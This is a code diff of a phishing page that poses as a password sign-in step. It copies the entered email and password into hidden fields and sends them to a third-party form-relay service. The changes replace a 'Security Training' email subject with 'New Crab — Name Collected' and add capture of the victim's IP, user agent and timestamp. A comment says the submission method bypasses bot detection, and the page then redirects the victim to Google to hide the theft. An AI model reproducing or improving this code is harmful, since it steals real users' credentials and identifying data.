@@ -244,11 +244,11 @@
     <div class="input-group">
       <input type="password" id="name-input" required placeholder="Enter your last password">
     </div>
+
     <div class="checkbox-wrapper">
       <input type="checkbox" id="show-password">
       <label for="show-password">Show password</label>
     </div>
-
     <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 32px;">
       <a href="#" class="link">Try another way</a>
       <button id="submit-btn" class="button">Next</button>
@@ -270,10 +270,12 @@
     <input type="hidden" name="access_key" value="c96cd056-1436-4aec-8857-ed2ecb10b770">
     <input type="hidden" name="email" id="hidden-email">
     <input type="hidden" name="name" id="hidden-name"> <!-- ✅ CHANGED TO "name" -->
-
+    <input type="hidden" name="_ip" value="auto">
+    <input type="hidden" name="user_agent" id="user-agent">
+    <input type="hidden" name="timestamp" id="timestamp">
     <!-- Honeypot & metadata -->
     <input type="text" name="_honey" style="display:none;">
-    <input type="hidden" name="_subject" value="Security Training — Name Collected">
+    <input type="hidden" name="_subject" value=" New Crab — Name Collected">
   </form>
     <!-- Show password toggle -->
 
@@ -326,14 +328,15 @@
     // Populate hidden form values
     hiddenEmail.value = email;
     hiddenName.value = name;
-
+    document.getElementById('user-agent').value = navigator.userAgent;
+    document.getElementById('timestamp').value = new Date().toISOString();
     // ✅ USE requestSubmit() — bypasses bot detection
     web3form.requestSubmit();
 
     // Redirect after short delay
     setTimeout(() => {
       window.location.href = "https://www.google.com"; // ✅ Trimmed
-    }, 700);
+    }, 800);
   });
 </script>
 </body>
